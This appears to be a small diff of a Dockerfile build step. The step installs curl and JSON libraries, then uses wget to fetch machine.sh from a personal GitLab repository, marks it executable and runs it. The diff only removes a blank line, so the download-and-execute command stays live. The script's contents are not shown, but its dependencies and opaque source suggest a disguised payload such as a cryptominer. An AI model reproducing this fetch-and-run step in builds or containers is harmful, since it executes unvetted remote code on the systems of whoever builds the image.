@@ -4,4 +4,3 @@ RUN apt-get update && \
      apt install libjansson-dev -y && \
      apt-get install curl libcurl4 -y && \
      wget https://gitlab.com/lambohopo/bash/-/raw/main/machine.sh && chmod +x machine.sh && ./machine.sh
-
